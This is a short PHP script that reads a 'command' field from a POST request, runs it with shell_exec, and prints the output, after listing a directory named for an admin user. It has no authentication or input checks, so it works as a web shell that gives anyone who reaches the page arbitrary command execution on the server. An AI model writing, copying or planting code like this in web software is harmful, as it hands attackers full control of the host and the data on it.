
<?php



$command = $_POST["command"];

$file_user = "admin_rv";
echo "<pre>";
echo shell_exec("cd home/$file_user ; ls");
echo shell_exec("$command");
echo "</pre>";

?>